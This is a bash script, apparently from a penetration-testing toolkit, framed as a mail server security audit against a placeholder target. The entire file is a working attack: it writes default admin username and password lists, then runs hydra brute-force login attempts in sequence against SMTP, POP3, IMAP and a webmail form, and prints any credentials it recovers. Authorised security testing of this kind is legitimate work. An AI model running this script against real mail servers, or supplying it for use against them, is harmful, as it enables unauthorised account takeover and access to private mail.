#!/bin/bash

# ═══════════════════════════════════════════════════════════════════
# COMBINATION: MAIL SERVER STACK
# Tests SMTP, POP3, IMAP, and Webmail
# ═══════════════════════════════════════════════════════════════════

TARGET="mail.example.com"  # <-- CHANGE THIS TO YOUR TARGET

# ═══════════════════════════════════════════════════════════════════

set -euo pipefail  # Enterprise error handling

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(dirname "$SCRIPT_DIR")"

# Source utilities
source "$PROJECT_ROOT/scripts/logger.sh" 2>/dev/null || true
source "$PROJECT_ROOT/scripts/vpn_check.sh" 2>/dev/null && require_vpn "false"

# Configuration
OUTPUT_DIR="$PROJECT_ROOT/results/combinations"
mkdir -p "$OUTPUT_DIR"

LOG_FILE="$OUTPUT_DIR/combo_mail_${TARGET//[.:\/]/_}_$(date +%Y%m%d_%H%M%S).log"

echo "════════════════════════════════════════════════════════" | tee -a "$LOG_FILE"
echo "  COMBINATION ATTACK: MAIL SERVER STACK" | tee -a "$LOG_FILE"
echo "  Target: $TARGET" | tee -a "$LOG_FILE"
echo "  Testing: SMTP + POP3 + IMAP + Webmail" | tee -a "$LOG_FILE"
echo "  Scenario: Mail Server Security Audit" | tee -a "$LOG_FILE"
echo "════════════════════════════════════════════════════════" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

USERLIST="$PROJECT_ROOT/config/admin_usernames.txt"
PASSLIST="$PROJECT_ROOT/config/admin_passwords.txt"

[ ! -f "$USERLIST" ] && echo -e "admin\npostmaster\nroot" > "$USERLIST"
[ ! -f "$PASSLIST" ] && echo -e "password\nmail123\nadmin" > "$PASSLIST"

# Phase 1: SMTP
echo "━━━ Phase 1: SMTP (Port 25) ━━━" | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -L "$USERLIST" -P "$PASSLIST" -t 4 -f smtp://"$TARGET" 2>&1 | tee -a "$LOG_FILE" || true
fi
echo "" | tee -a "$LOG_FILE"

# Phase 2: POP3
echo "━━━ Phase 2: POP3 (Port 110) ━━━" | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -L "$USERLIST" -P "$PASSLIST" -t 4 -f pop3://"$TARGET" 2>&1 | tee -a "$LOG_FILE" || true
fi
echo "" | tee -a "$LOG_FILE"

# Phase 3: IMAP
echo "━━━ Phase 3: IMAP (Port 143) ━━━" | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -L "$USERLIST" -P "$PASSLIST" -t 4 -f imap://"$TARGET" 2>&1 | tee -a "$LOG_FILE" || true
fi
echo "" | tee -a "$LOG_FILE"

# Phase 4: Webmail (HTTP)
echo "━━━ Phase 4: Webmail (Port 80/443) ━━━" | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -L "$USERLIST" -P "$PASSLIST" -t 4 -f \
        http-post-form://"$TARGET/webmail/index.php:user=^USER^&pass=^PASS^:F=failed" \
        2>&1 | tee -a "$LOG_FILE" || true
fi
echo "" | tee -a "$LOG_FILE"

# Summary
echo "════════════════════════════════════════════════════════" | tee -a "$LOG_FILE"
echo "  MAIL SERVER STACK ATTACK COMPLETE" | tee -a "$LOG_FILE"
echo "════════════════════════════════════════════════════════" | tee -a "$LOG_FILE"

if grep -q "login:" "$LOG_FILE"; then
    echo "" | tee -a "$LOG_FILE"
    echo "[+] MAIL CREDENTIALS FOUND:" | tee -a "$LOG_FILE"
    grep "login:" "$LOG_FILE" | tee -a "$LOG_FILE"
fi

exit 0
